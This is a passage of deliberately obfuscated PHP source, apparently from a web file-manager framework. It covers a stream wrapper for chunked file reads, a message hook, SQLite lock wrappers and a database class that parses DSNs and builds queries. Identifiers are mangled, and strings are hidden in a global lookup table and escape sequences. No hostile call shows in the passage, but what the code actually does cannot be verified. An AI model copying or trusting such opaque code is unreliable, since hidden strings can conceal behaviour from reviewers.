$£ÂÊ‰¸; } public function stream_tell() { return $this->pose; } public function stream_seek($»¦Â®íÕ, $èŞÇÆ‘Ş) { $­°Êö =& $_SERVER[´È¥ö†ö]; if ($èŞÇÆ‘Ş == SEEK_SET) { $this->pose = $»¦Â®íÕ; } else { if ($èŞÇÆ‘Ş == SEEK_CUR) { $this->pose += $»¦Â®íÕ; } else { if ($èŞÇÆ‘Ş == SEEK_END) { $this->pose = $this->info[$­°Êö[79]] + intval($»¦Â®íÕ); } } } if ($»¦Â®íÕ < 0) { $this->pose = $this->info[$­°Êö[79]] + $»¦Â®íÕ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[´È¥ö†ö][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Œ•·ù•ş, $ÃŠˆåÚ) { $éö¢‚³¼ =& $_SERVER[´È¥ö†ö]; $³Äú = $this->info($Œ•·ù•ş); return array($éö¢‚³¼[1399] => 0, $éö¢‚³¼[1608] => 0, $éö¢‚³¼[16] => 32768 + 511, $éö¢‚³¼[1609] => 0, $éö¢‚³¼[1610] => 0, $éö¢‚³¼[1611] => 0, $éö¢‚³¼[1612] => 0, $éö¢‚³¼[79] => $³Äú[$éö¢‚³¼[79]], $éö¢‚³¼[1613] => $³Äú[$éö¢‚³¼[1454]], $éö¢‚³¼[1570] => $³Äú[$éö¢‚³¼[88]], $éö¢‚³¼[1569] => $³Äú[$éö¢‚³¼[233]], $éö¢‚³¼[1614] => 0, $éö¢‚³¼[1615] => 0); } static $fileInfo = array(); public function info($‡­§’ı) { $Ë™êØÇû = $_SERVER[´È¥ö†ö][1616]; if (isset(self::$fileInfo[$‡­§’ı])) { return self::$fileInfo[$‡­§’ı]; } if (substr($‡­§’ı, 0, strlen($Ë™êØÇû)) != $Ë™êØÇû) { return !1; } self::$fileInfo[$‡­§’ı] = IO::info(substr($‡­§’ı, strlen($Ë™êØÇû))); return self::$fileInfo[$‡­§’ı]; } public static function read($¦´îî¯, $Ø€–˜Õ, $ä§š¦µá) { if (!isset(self::$_fopenCache[$¦´îî¯])) { $ç¼úé“¨ = new StreamWrapperIO(); $ç¼úé“¨->stream_open($¦´îî¯); self::$_fopenCache[$¦´îî¯] = $ç¼úé“¨; } $ç¼úé“¨ = self::$_fopenCache[$¦´îî¯]; return $ç¼úé“¨->fileSubstr($Ø€–˜Õ, $ä§š¦µá); } public static function _read($üÓìÊ», $ĞÚöû—Í, $Æ ç¶²) { $ ­´°Ù³ =& $_SERVER[´È¥ö†ö]; $ì—µçÏú = fopen($üÓìÊ», $ ­´°Ù³[1458]); if (!$ì—µçÏú) { return $ ­´°Ù³[12]; } $î¿«Áşù = 8192; fseek($ì—µçÏú, $ĞÚöû—Í, SEEK_SET); $ğïˆ¹»û = $ ­´°Ù³[12]; $Ãµøı·¬ = 0; while ($Ãµøı·¬ < $Æ ç¶²) { $İ²Ú¹ú = min($î¿«Áşù, $Æ ç¶² - $Ãµøı·¬); $ğïˆ¹»û .= fread($ì—µçÏú, $İ²Ú¹ú); $Ãµøı·¬ += $İ²Ú¹ú; } fclose($ì—µçÏú); return $ğïˆ¹»û; } public function fileSubstr($“ÂãÆê, $—¤ü§øÜ) { $£¹ºÑ =& $_SERVER[´È¥ö†ö]; $æ„è = $this->info[$£¹ºÑ[79]]; $ßÓ¨°‹« = $“ÂãÆê; $é”„¹¼ = $—¤ü§øÜ; if ($“ÂãÆê < 0) { $“ÂãÆê = $æ„è + $“ÂãÆê; } if ($—¤ü§øÜ === !1) { $—¤ü§øÜ = $æ„è - $“ÂãÆê; } if ($“ÂãÆê + $—¤ü§øÜ > $æ„è) { $—¤ü§øÜ = $æ„è - $“ÂãÆê; } if ($—¤ü§øÜ <= 0) { return $£¹ºÑ[12]; } if ($“ÂãÆê < 0 || $“ÂãÆê >= $æ„è || $—¤ü§øÜ <= 0 || $—¤ü§øÜ > 1024 * 1024 * 10) { throw new Exception("\151\157\106\151\x6c\x65\x52\145\141\144\40\x65\x72\x72\157\162\41\x20\x73\x74\141\x72\x74\x3d{$“ÂãÆê}\73\x6c\x65\x6e\147\x74\x68\75{$—¤ü§øÜ}\73\40\x73\x69\x7a\x65\75{$æ„è}\73"); } $¾äÇ¨Ûä = 64 * 1024; $ÙâĞú§ =& self::$_chunkBuffer[$this->path]; if (!$ÙâĞú§) { $ÙâĞú§ = array(); } $åïËÌİ• = 0; $ËÍœ’µ = 0; $Ï¥Œ¤Ø¨ = $£¹ºÑ[12]; foreach ($ÙâĞú§ as $åïËÌİ• => $Ï¥Œ¤Ø¨) { $åïËÌİ• = intval($åïËÌİ•); $ËÍœ’µ = $åïËÌİ• + strlen($Ï¥Œ¤Ø¨); if ($“ÂãÆê >= $ËÍœ’µ) { continue; } if ($“ÂãÆê >= $åïËÌİ• && $“ÂãÆê + $—¤ü§øÜ <= $ËÍœ’µ) { return substr($Ï¥Œ¤Ø¨, $“ÂãÆê - $åïËÌİ•, $—¤ü§øÜ); } break; } if (count($ÙâĞú§) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($£¹ºÑ[1617], $£¹ºÑ[1618] . count($ÙâĞú§) . "\73\163\x74\x61\x72\164\75{$“ÂãÆê}\54\154\x65\x6e\x67\164\150\x3d{$—¤ü§øÜ}\x3b\x70\157\163\x65\72{$åïËÌİ•}\x7e{$ËÍœ’µ}"); throw new Exception($£¹ºÑ[1619]); } $±‘›“úÂ = intval($“ÂãÆê / $¾äÇ¨Ûä) * $¾äÇ¨Ûä; $­ô·“¼ = ceil(($“ÂãÆê + $—¤ü§øÜ) / $¾äÇ¨Ûä) * $¾äÇ¨Ûä - $±‘›“úÂ; $³ô¡¹ğé = IO::fileSubstr($this->path, $±‘›“úÂ, $­ô·“¼); $ÙâĞú§[$±‘›“úÂ . $£¹ºÑ[12]] = $³ô¡¹ğé; ksort($ÙâĞú§); $ş¦ª¸üù = substr($³ô¡¹ğé, $“ÂãÆê - $±‘›“úÂ, $—¤ü§øÜ); return $ş¦ª¸üù; } private function log($º¸µœŒ, $€§ÑÊØÚ) { $ğØÁ£ö÷ =& $_SERVER[´È¥ö†ö]; $êÁç–¦œ = timeFloat() - $this->timeStart; write_log(sprintf($ğØÁ£ö÷[1620], $º¸µœŒ, $this->info[$ğØÁ£ö÷[32]], $êÁç–¦œ, $€§ÑÊØÚ), $ğØÁ£ö÷[1263]); } } class Message { function __construct() { } public function send($Úåº™ï = '', $çÈ¤¦¢ã = array(), $â‡ïÊì = "\x74\145\x78\164") { $ï¸Ç×î =& $_SERVER[´È¥ö†ö]; $¸ÉåĞç = array($ï¸Ç×î[33] => $ï¸Ç×î[1212], $ï¸Ç×î[171] => $Úåº™ï); if (in_array($â‡ïÊì, array($ï¸Ç×î[1212], $ï¸Ç×î[1621]))) { $¸ÉåĞç[$ï¸Ç×î[33]] = $â‡ïÊì; } $çÈ¤¦¢ã = array($ï¸Ç×î[589] => isset($çÈ¤¦¢ã[$ï¸Ç×î[589]]) ? $çÈ¤¦¢ã[$ï¸Ç×î[589]] : $ï¸Ç×î[12], $ï¸Ç×î[676] => isset($çÈ¤¦¢ã[$ï¸Ç×î[676]]) ? $çÈ¤¦¢ã[$ï¸Ç×î[676]] : $ï¸Ç×î[12]); if (empty($Úåº™ï) || empty($çÈ¤¦¢ã[$ï¸Ç×î[589]]) && empty($çÈ¤¦¢ã[$ï¸Ç×î[676]])) { return !1; } $Ş’åÂ = array($ï¸Ç×î[1550] => $¸ÉåĞç, $ï¸Ç×î[1622] => $çÈ¤¦¢ã); Hook::trigger($ï¸Ç×î[1623], $Ş’åÂ); } } goto Aå·„íç; dÊÛ›ãÊÄ®: class DbSqlite extends DbSqliteBase { public function query($“±øÇ…) { $Î ÇšòÄ =& $_SERVER[´È¥ö†ö]; if (!CacheLock::fileLock($Î ÇšòÄ[13])) { return !1; } $Š¦®’åı = parent::query($“±øÇ…); CacheLock::fileUnLock($Î ÇšòÄ[13]); return $Š¦®’åı; } public function execute($™ƒš”ÇË) { $Ş•÷”•ê =& $_SERVER[´È¥ö†ö]; if (!CacheLock::fileLock($Ş•÷”•ê[13])) { return !1; } $Ä½Êª‚÷ = parent::execute($™ƒš”ÇË); CacheLock::fileUnLock($Ş•÷”•ê[13]); return $Ä½Êª‚÷; } } class DbSqlite3 extends DbSqlite3Base { public function query($¹öä”È¸) { $şî÷§ÑÌ =& $_SERVER[´È¥ö†ö]; if (!CacheLock::fileLock($şî÷§ÑÌ[13])) { return !1; } $µî¢ »õ = parent::query($¹öä”È¸); CacheLock::fileUnLock($şî÷§ÑÌ[13]); return $µî¢ »õ; } public function execute($Åšº˜³) { $ÄÌÌĞˆ¾ =& $_SERVER[´È¥ö†ö]; if (!CacheLock::fileLock($ÄÌÌĞˆ¾[13])) { return !1; } $üªŠÎå = parent::execute($Åšº˜³); CacheLock::fileUnLock($ÄÌÌĞˆ¾[13]); return $üªŠÎå; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\x68\151\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\75", "\x6e\x65\x71" => "\74\76", "\147\x74" => "\x3e", "\145\x67\x74" => "\x3e\75", "\154\164" => "\74", "\x65\154\164" => "\x3c\x3d", "\x6e\157\x74\154\151\x6b\145" => "\116\117\124\40\x4c\111\x4b\x45", "\x6c\x69\153\x65" => "\114\x49\113\x45", "\x69\156" => "\111\x4e", "\x6e\x6f\164\x69\156" => "\x4e\117\124\40\x49\x4e", "\156\157\164\40\151\156" => "\116\x4f\x54\x20\111\116", "\142\145\164\167\145\x65\156" => "\102\x45\124\127\x45\x45\116", "\x6e\x6f\164\x62\145\x74\167\x65\145\x6e" => "\x4e\117\x54\40\102\105\x54\x57\105\x45\116", "\156\x6f\164\x20\142\x65\164\167\x65\x65\156" => "\116\x4f\124\x20\102\x45\x54\x57\x45\105\116"); protected $selectSql = "\x53\105\114\x45\103\124\x25\104\111\x53\124\111\116\x43\x54\45\x20\45\x46\x49\105\x4c\x44\x25\x20\x46\122\x4f\115\x20\45\x54\101\102\114\x45\45\x25\112\117\x49\116\x25\x25\127\x48\x45\x52\105\45\45\107\x52\117\125\120\45\x25\110\101\126\x49\116\x47\x25\x25\x4f\122\x44\x45\x52\x25\x25\114\111\x4d\x49\124\45\40\x25\x55\116\x49\117\x4e\x25\x25\x43\x4f\x4d\x4d\x45\116\124\45"; protected $bind = array(); public static function getInstance() { $Ü‹ğ¸ğø = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[´È¥ö†ö][1036], $Ü‹ğ¸ğø); } public function factory($²‡é÷î‹ = '') { $š€¡¢³Ñ =& $_SERVER[´È¥ö†ö]; $²‡é÷î‹ = $this->parseConfig($²‡é÷î‹); if (empty($²‡é÷î‹[$š€¡¢³Ñ[1037]])) { think_exception(think_lang($š€¡¢³Ñ[1038])); } $this->dbType = ucwords(strtolower($²‡é÷î‹[$š€¡¢³Ñ[1037]])); $ªœº®Ú¼ = $š€¡¢³Ñ[1039] . $this->dbType; if (class_exists($ªœº®Ú¼)) { $Êì‚åâ¦ = new $ªœº®Ú¼($²‡é÷î‹); if ($š€¡¢³Ñ[1040] != strtolower($²‡é÷î‹[$š€¡¢³Ñ[1037]])) { $Êì‚åâ¦->dbType = strtoupper($this->dbType); } else { $Êì‚åâ¦->dbType = $this->_getDsnType($²‡é÷î‹[$š€¡¢³Ñ[992]]); } } else { think_exception(think_lang($š€¡¢³Ñ[1041]) . $š€¡¢³Ñ[1042] . $ªœº®Ú¼); } return $Êì‚åâ¦; } public function __call($‹¥§äŒ–, $ÜÀÔÓ‘ã) { if (method_exists($this, $‹¥§äŒ–)) { return call_user_func_array(array($this, $‹¥§äŒ–), $ÜÀÔÓ‘ã); } } protected function _getDsnType($¢§ÁÈ) { $æİÈÇÁ€ = explode($_SERVER[´È¥ö†ö][4], $¢§ÁÈ); $Õ›¢¯üÖ = strtoupper(trim($æİÈÇÁ€[0])); return $Õ›¢¯üÖ; } private function parseConfig($¸¬§ »« = '') { $¤™Ö¡ =& $_SERVER[´È¥ö†ö]; if (!empty($¸¬§ »«) && is_string($¸¬§ »«)) { $¸¬§ »« = $this->parseDSN($¸¬§ »«); } elseif (is_array($¸¬§ »«)) { $¸¬§ »« = array_change_key_case($¸¬§ »«); $¸¬§ »« = array($¤™Ö¡[1037] => $¸¬§ »«[$¤™Ö¡[1043]], $¤™Ö¡[964] => $¸¬§ »«[$¤™Ö¡[1044]], $¤™Ö¡[965] => $¸¬§ »«[$¤™Ö¡[1045]], $¤™Ö¡[962] => $¸¬§ »«[$¤™Ö¡[1046]], $¤™Ö¡[963] => $¸¬§ »«[$¤™Ö¡[1047]], $¤™Ö¡[21] => $¸¬§ »«[$¤™Ö¡[1048]], $¤™Ö¡[992] => $¸¬§ »«[$¤™Ö¡[1049]], $¤™Ö¡[17] => isset($¸¬§ »«[$¤™Ö¡[1050]]) ? $¸¬§ »«[$¤™Ö¡[1050]] : array()); } elseif (empty($¸¬§ »«)) { if (think_config($¤™Ö¡[1051]) && $¤™Ö¡[1040] != strtolower(think_config($¤™Ö¡[1052]))) { $¸¬§ »« = $this->parseDSN(think_config($¤™Ö¡[1051])); } else { $¸¬§ »« = array($¤™Ö¡[1037] => think_config($¤™Ö¡[1052]), $¤™Ö¡[964] => think_config($¤™Ö¡[1053]), $¤™Ö¡[965] => think_config($¤™Ö¡[1054]), $¤™Ö¡[962] => think_config($¤™Ö¡[1055]), $¤™Ö¡[963] => think_config($¤™Ö¡[1056]), $¤™Ö¡[21] => think_config($¤™Ö¡[334]), $¤™Ö¡[992] => think_config($¤™Ö¡[1051]), $¤™Ö¡[17] => think_config($¤™Ö¡[1057])); } } return $¸¬§ »«; } protected function initConnect($°å´Ï¢Œ = true) { if (1 == think_config($_SERVER[´È¥ö†ö][22])) { $this->_linkID = $this->multiConnect($°å´Ï¢Œ); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $¾ïÌÄ¥´ => $Ï®Âå…æ) { $this->_linkID = $Ï®Âå…æ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ğšçÅ›¼ = false) { $ä¼³Æ–ô =& $_SERVER[´È¥ö†ö]; static $Á¥ĞÏôÓ = array(); static $¼Ùº×éƒ = -1; if (empty($Á¥ĞÏôÓ)) { foreach ($this->config as $ËÜË­¾ => $ßŠ¹Š‡Œ) { $Á¥ĞÏôÓ[$ËÜË­¾] = explode($ä¼³Æ–ô[50], $ßŠ¹Š‡Œ); } } if (think_config($ä¼³Æ–ô[1058])) { if ($ğšçÅ›¼ || think_config($ä¼³Æ–ô[482]) === !0) { $À˜Íò¥ = floor(mt_rand(0, think_config($ä¼³Æ–ô[1059]) - 1)); $¼Ùº×éƒ = $À˜Íò¥; } else { if (is_numeric(think_config($ä¼³Æ–ô[1060]))) { $À˜Íò¥ = think_config($ä¼³Æ–ô[1060]); } else { $À˜Íò¥ = floor(mt_rand(think_config($ä¼³Æ–ô[1059]), count($Á¥ĞÏôÓ[$ä¼³Æ–ô[962]]) - 1)); } } } else { $À˜Íò¥ = floor(mt_rand(0, count($Á¥ĞÏôÓ[$ä¼³Æ–ô[962]]) - 1)); $¼Ùº×éƒ = $À˜Íò¥; } $À˜Íò¥ = $¼Ùº×éƒ !== -1 ? $¼Ùº×éƒ : $À˜Íò¥; $óûçû° = array($ä¼³Æ–ô[964] => isset($Á¥ĞÏôÓ[$ä¼³Æ–ô[964]][$À˜Íò¥]) ? $Á¥ĞÏôÓ[$ä¼³Æ–ô[964]][$À˜Íò¥] : $Á¥ĞÏôÓ[$ä¼³Æ–ô[964]][0], $ä¼³Æ–ô[965] => isset($Á¥ĞÏôÓ[$ä¼³Æ–ô[965]][$À˜Íò¥]) ? $Á¥ĞÏôÓ[$ä¼³Æ–ô[965]][$À˜Íò¥] : $Á¥ĞÏôÓ[$ä¼³Æ–ô[965]][0], $ä¼³Æ–ô[962] => isset($Á¥ĞÏôÓ[$ä¼³Æ–ô[962]][$À˜Íò¥]) ? $Á¥ĞÏôÓ[$ä¼³Æ–ô[962]][$À˜Íò¥] : $Á¥ĞÏôÓ[$ä¼³Æ–ô[962]][0], $ä¼³Æ–ô[963] => isset($Á¥ĞÏôÓ[$ä¼³Æ–ô[963]][$À˜Íò¥]) ? $Á¥ĞÏôÓ[$ä¼³Æ–ô[963]][$À˜Íò¥] : $Á¥ĞÏôÓ[$ä¼³Æ–ô[963]][0], $ä¼³Æ–ô[21] => isset($Á¥ĞÏôÓ[$ä¼³Æ–ô[21]][$À˜Íò¥]) ? $Á¥ĞÏôÓ[$ä¼³Æ–ô[21]][$À˜Íò¥] : $Á¥ĞÏôÓ[$ä¼³Æ–ô[21]][0], $ä¼³Æ–ô[992] => isset($Á¥ĞÏôÓ[$ä¼³Æ–ô[992]][$À˜Íò¥]) ? $Á¥ĞÏôÓ[$ä¼³Æ–ô[992]][$À˜Íò¥] : $Á¥ĞÏôÓ[$ä¼³Æ–ô[992]][0], $ä¼³Æ–ô[17] => isset($Á¥ĞÏôÓ[$ä¼³Æ–ô[17]][$À˜Íò¥]) ? $Á¥ĞÏôÓ[$ä¼³Æ–ô[17]][$À˜Íò¥] : $Á¥ĞÏôÓ[$ä¼³Æ–ô[17]][0]); return $this->connect($óûçû°, $À˜Íò¥); } public function parseDSN($ËŒÓ§›™) { $ÒßÚ¢ñ­ =& $_SERVER[´È¥ö†ö]; if (empty($ËŒÓ§›™)) { return !1; } $…İ¶ı˜› = parse_url($ËŒÓ§›™); if ($…İ¶ı˜›[$ÒßÚ¢ñ­[207]]) { $“½í‘ø€ = array($ÒßÚ¢ñ­[1037] => $…İ¶ı˜›[$ÒßÚ¢ñ­[207]], $ÒßÚ¢ñ­[964] => isset($…İ¶ı˜›[$ÒßÚ¢ñ­[676]]) ? $…İ¶ı˜›[$ÒßÚ¢ñ­[676]] : $ÒßÚ¢ñ­[12], $ÒßÚ¢ñ­[965] => isset($…İ¶ı˜›[$ÒßÚ¢ñ­[1061]]) ? $…İ¶ı˜›[$ÒßÚ¢ñ­[1061]] : $ÒßÚ¢ñ­[12], $ÒßÚ¢ñ­[962] => isset($…İ¶ı˜›[$ÒßÚ¢ñ­[208]]) ? $…İ¶ı˜›[$ÒßÚ¢ñ­[208]] : $ÒßÚ¢ñ­[12], $ÒßÚ¢ñ­[963] => isset($…İ¶ı˜›[$ÒßÚ¢ñ­[209]]) ? $…İ¶ı˜›[$ÒßÚ¢ñ­[209]] : $ÒßÚ¢ñ­[12], $ÒßÚ¢ñ­[21] => isset($…İ¶ı˜›[$ÒßÚ¢ñ­[87]]) ? substr($…İ¶ı˜›[$ÒßÚ¢ñ­[87]], 1) : $ÒßÚ¢ñ­[12]); } else { preg_match($ÒßÚ¢ñ­[1062], trim($ËŒÓ§›™), $Ãïöä¨Ó); $“½í‘ø€ = array($ÒßÚ¢ñ­[1037] => $Ãïöä¨Ó[1], $ÒßÚ¢ñ­[964] => $Ãïöä¨Ó[2], $ÒßÚ¢ñ­[965] => $Ãïöä¨Ó[3], $ÒßÚ¢ñ­[962] => $Ãïöä¨Ó[4], $ÒßÚ¢ñ­[963] => $Ãïöä¨Ó[5], $ÒßÚ¢ñ­[21] => $Ãïöä¨Ó[6]); } $“½í‘ø€[$ÒßÚ¢ñ­[992]] = $ÒßÚ¢ñ­[12]; return $“½í‘ø€; } protected function debug() { $àÕæñ÷ù =& $_SERVER[´È¥ö†ö]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $àÕæñ÷ù[1063]; if (think_config($àÕæñ÷ù[1064])) { think_status($àÕæñ÷ù[1065]); think_trace($this->queryStr . $àÕæñ÷ù[1066] . think_status($àÕæñ÷ù[24], $àÕæñ÷ù[1065], 6) . $àÕæñ÷ù[1067], $àÕæñ÷ù[12], $àÕæñ÷ù[1068]); } } protected function parseLock($ıÍáëòè = false) { $ßÔ‹ô—Ş =& $_SERVER[´È¥ö†ö]; if (!$ıÍáëòè) { return $ßÔ‹ô—Ş[12]; } if ($ßÔ‹ô—Ş[994] == $this->dbType) { return $ßÔ‹ô—Ş[1069]; } return $ßÔ‹ô—Ş[1070]; } protected function parseSet($õßüŞÑä) { $Àêó¯í© =& $_SERVER[´È¥ö†ö]; foreach ($õßüŞÑä as $Ó£Üï›É => $×ÎâËö£) { if (is_array($×ÎâËö£) && $Àêó¯í©[383] == $×ÎâËö£[0]) { $ã «˜¼Ù[] = $this->parseKey($Ó£Üï›É) . $Àêó¯í©[517] . $×ÎâËö£[1]; } elseif (is_scalar($×ÎâËö£) || is_null($×ÎâËö£)) { $ã «˜¼Ù[] = $this->parseKey($Ó£Üï›É) . $Àêó¯í©[517] . $this->parseValue($×ÎâËö£); } } return $Àêó¯í©[1071] . implode($Àêó¯í©[50], $ã «˜¼Ù); } protected function bindParam($ôŸ¯ıÁ, $½­¶ªÌ) { $this->bind[$_SERVER[´È¥ö†ö][4] . $ôŸ¯ıÁ] = $½­¶ªÌ; } protected function parseBind($Â£ºÎÒ) { $Â£ºÎÒ = array_merge($this->bind, $Â£ºÎÒ); $this->bind = array(); return $Â£ºÎÒ; } function parseKey(&$¨­İË†ª, $·Î­‘îĞ = true) { if ($·Î­‘îĞ) { $¨­İË†ª = $this->parseKeyCheck($¨­İË†ª); } return $¨­İË†ª; } function parseKeyCheck($«ÊÛ•´„) { $…´Ô†‰Á =& $_SERVER[´È¥ö†ö]; $«ÊÛ•´„ = trim($«ÊÛ•´„); if (!preg_match($…´Ô†‰Á[1072], $«ÊÛ•´„)) { think_exception($…´Ô†‰Á[1073] . $«ÊÛ•´„); } return $«ÊÛ•´„; } protected function parseValue($Ÿ ½³ä) { $’ã’š¤´ =& $_SERVER[´È¥ö†ö]; if (is_string($Ÿ ½³ä)) { $Ÿ ½³ä = $’ã’š¤´[1033] . $this->escapeString($Ÿ ½³ä) . $’ã’š¤´[1033]; } elseif (isset($Ÿ ½³ä[0]) && is_string($Ÿ ½³ä[0]) && strtolower($Ÿ ½³ä[0]) == $’ã’š¤´[383]) { $Ÿ ½³ä = $this->escapeString($Ÿ ½³ä[1]); } elseif (is_array($Ÿ ½³ä)) { $Ÿ ½³ä = array_map(array($this, $’ã’š¤´[1034]), $Ÿ ½³ä); } elseif (is_bool($Ÿ ½³ä)) { $Ÿ ½³ä = $Ÿ ½³ä ? $’ã’š¤´[91] : $’ã’š¤´[230]; } elseif (is_null($Ÿ ½³ä)) { $Ÿ ½³ä = $’ã’š¤´[106]; } return $Ÿ ½³ä; } protected function parseField($„ÄßšÜ) { $ˆ¯êµ¡ù =& $_SERVER[´È¥ö†ö]; if (is_string($„ÄßšÜ) && strpos($„ÄßšÜ, $ˆ¯êµ¡ù[50])) { $„ÄßšÜ = explode($ˆ¯êµ¡ù[50], $„ÄßšÜ); } if (is_array($„ÄßšÜ)) { $¤ıÊ‡•· = array(); foreach ($„ÄßšÜ as $•¸¥ˆ™ => $üêÈ™Ô) { if (!is_numeric($•¸¥ˆ™)) { $¤ıÊ‡•·[] = $this->parseKey($•¸¥ˆ™, !1) . $ˆ¯êµ¡ù[1074] . $this->parseKey($üêÈ™Ô); } else { $¤ıÊ‡•·[] = $this->parseKey($üêÈ™Ô); } } $¨ı‰¶â = implode($ˆ¯êµ¡ù[50], $¤ıÊ‡•·); } elseif (is_string($„ÄßšÜ) && !empty($„ÄßšÜ)) { $¨ı‰¶â = $„ÄßšÜ; } else { $¨ı‰¶â = $ˆ¯êµ¡ù[222]; } return $¨ı‰¶â; } protected function parseTable($¼‚Çİé„) { $ÚÔÂ =& $_SERVER[´È¥ö†ö]; if (is_array($¼‚Çİé„)) { $ÎÍıûä = array(); foreach ($¼‚Çİé„ as $úÕ¨ò¦‹ => $ã³å‹Œô) { if (!is_numeric($úÕ¨ò¦‹)) { $ÎÍıûä[] = $this->parseKey($úÕ¨ò¦‹) . $ÚÔÂ[53] . $this->parseKey($ã³å‹Œô); } else { $ÎÍıûä[] = $this->parseKey($úÕ¨ò¦‹); } } $¼‚Çİé„ = $ÎÍıûä; } elseif (is_string($¼‚Çİé„)) { if (strstr($¼‚Çİé„, $ÚÔÂ[53])) { return $¼‚Çİé„; } $¼‚Çİé„ = explode($ÚÔÂ[50], $¼‚Çİé„); array_walk($¼‚Çİé„, array($this, $ÚÔÂ[982])); } return $ÚÔÂ[976] . trim(implode($ÚÔÂ[1075], $¼‚Çİé„), $ÚÔÂ[472]) . $ÚÔÂ[976]; } protected function parseWhere($¶³Î”ôÃ) { $„–ÁõŞ½ =& $_SERVER[´È¥ö†ö]; $üñ§ƒô = $„–ÁõŞ½[12]; if (is_string($¶³Î”ôÃ)) { $üñ§ƒô = $¶³Î”ôÃ; } else { $°´¼é¸Ü = isset($¶³Î”ôÃ[$„–ÁõŞ½[1076]]) ? strtoupper($¶³Î”ôÃ[$„–ÁõŞ½[1076]]) : $„–ÁõŞ½[12]; if (in_array($°´¼é¸Ü, array($„–ÁõŞ½[1077], $„–ÁõŞ½[1078], $„–ÁõŞ½[1079]))) { $°´¼é¸Ü = $„–ÁõŞ½[53] . $°´¼é¸Ü . $„–ÁõŞ½[53]; unset($¶³Î”ôÃ[$„–ÁõŞ½[1076]]); } else { $°´¼é¸Ü = $„–ÁõŞ½[1080]; } foreach ($¶³Î”ôÃ as $Àí•şàå => $±³µ§¼) { $üñ§ƒô .= $„–ÁõŞ½[365]; if (is_numeric($Àí•şàå)) { $Àí•şàå = $„–ÁõŞ½[1081]; } if (0 === strpos($Àí•şàå, $„–ÁõŞ½[11])) { $üñ§ƒô .= $this->parseThinkWhere($Àí•şàå, $±³µ§¼); } else { if (!preg_match($„–ÁõŞ½[1082], trim($Àí•şàå))) { think_exception(think_lang($„–ÁõŞ½[1083]) . $„–ÁõŞ½[4] . $Àí•şàå); } $’Ÿö¬Ò = is_array($±³µ§¼) && isset($±³µ§¼[$„–ÁõŞ½[1084]]); $Àí•şàå = trim($Àí•şàå); if (strpos($Àí•şàå, $„–ÁõŞ½[214])) { $Ïº­±ÎÎ = explode($„–ÁõŞ½[214], $Àí•şàå); $¯¤§òùÇ = array(); foreach ($Ïº­±ÎÎ as $ºùÄôœ => $Ù€›Íš©) { $ôç»ÅæÜ = $’Ÿö¬Ò ? $±³µ§¼[$ºùÄôœ] : $±³µ§¼; $¯¤§òùÇ[] = $„–ÁõŞ½[348] . $this->parseWhereItem($this->parseKey($Ù€›Íš©), $ôç»ÅæÜ) . $„–ÁõŞ½[981]; } $üñ§ƒô .= implode($„–ÁõŞ½[1085], $¯¤§òùÇ); } elseif (strpos($Àí•şàå, $„–ÁõŞ½[286])) { $Ïº­±ÎÎ = explode($„–ÁõŞ½[286], $Àí•şàå); $¯¤§òùÇ = array(); foreach ($Ïº­±ÎÎ as $ºùÄôœ => $Ù€›Íš©) { $ôç»ÅæÜ = $’Ÿö¬Ò ? $±³µ§¼[$ºùÄôœ] : $±³µ§¼; $¯¤§òùÇ[] = $„–ÁõŞ½[348] . $this->parseWhereItem($this->parseKey($Ù€›Íš©), $ôç»ÅæÜ) . $„–ÁõŞ½[981]; } $üñ§ƒô .= implode($„–ÁõŞ½[1080], $¯¤§òùÇ); } else { $üñ§ƒô .= $this->parseWhereItem($this->parseKey($Àí•şàå), $±³µ§¼); } } $üñ§ƒô .= $„–ÁõŞ½[366] . $°´¼é¸Ü; } $üñ§ƒô = substr($üñ§ƒô, 0, -strlen($°´¼é¸Ü)); } return empty($üñ§ƒô) ? $„–ÁõŞ½[12] : $„–ÁõŞ½[1086] . $üñ§ƒô; } protected function parseWhereItem($ùª‘×ö´, $ÊíüĞã…) { $¨¨¶î¦ş =& $_SERVER[´È¥ö†ö]; $©¯ğ›í¬ = $¨¨¶î¦ş[12]; if (is_array($ÊíüĞã…)) { if (is_string($ÊíüĞã…[0])) { $âÀå¥ã” = strtolower($ÊíüĞã…[0]); if (in_array($ÊíüĞã…[0], array($¨¨¶î¦ş[517], $¨¨¶î¦ş[1087], $¨¨¶î¦ş[1088], $¨¨¶î¦ş[1089], $¨¨¶î¦ş[1090], $¨¨¶î¦ş[1091]))) { $©¯ğ›í¬ .= $ùª‘×ö´ . $¨¨¶î¦ş[53] . $ÊíüĞã…[0] . $¨¨¶î¦ş[53] . $this->parseValue($ÊíüĞã…[1]); } elseif (preg_match($¨¨¶î¦ş[1092], $ÊíüĞã…[0])) { $©¯ğ›í¬ .= $ùª‘×ö´ . $¨¨¶î¦ş[53] . $this->exp[$âÀå¥ã”] . $¨¨¶î¦ş[53] . $this->parseValue($ÊíüĞã…[1]); } elseif (preg_match($¨¨¶î¦ş[1093], $ÊíüĞã…[0])) { if (is_array($ÊíüĞã…[1])) { $ÜéÒÇÀ = isset($ÊíüĞã…[2]) ? strtoupper($ÊíüĞã…[2]) : $¨¨¶î¦ş[1078]; if (in_array($ÜéÒÇÀ, array($¨¨¶î¦ş[1077], $¨¨¶î¦ş[1078], $¨¨¶î¦ş[1079]))) { $’¸ë™ì± = array(); foreach ($ÊíüĞã…[1] as $««âÎÉ“) { $’¸ë™ì±[] = $ùª‘×ö´ . $¨¨¶î¦ş[53] . $this->exp[$âÀå¥ã”] . $¨¨¶î¦ş[53] . $this->parseValue($««âÎÉ“); } $©¯ğ›í¬ .= 